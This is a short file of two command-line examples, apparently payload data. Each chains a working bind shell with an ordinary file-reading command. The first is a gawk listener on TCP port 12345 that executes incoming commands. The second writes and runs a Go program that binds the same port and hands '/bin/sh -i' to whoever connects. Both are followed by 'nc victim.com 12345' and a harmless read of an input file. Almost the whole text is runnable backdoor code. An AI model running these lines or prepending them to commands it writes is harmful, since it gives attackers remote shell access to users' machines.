Examples:
gawk 'BEGIN {
    s = "/inet/tcp/12345/0/0";
    while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'; nc victim.com 12345; gawk '//' /path/to/input-file

echo -e 'package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go
go run /path/to/temp-file.go; nc victim.com 12345; echo -e 'package main
import (
	"fmt"
	"os"
)

func main(){
	b, _ := os.ReadFile("/path/to/input-file")
	fmt.Print(string(b))
}' >/path/to/temp-file.go
go run /path/to/temp-file.go

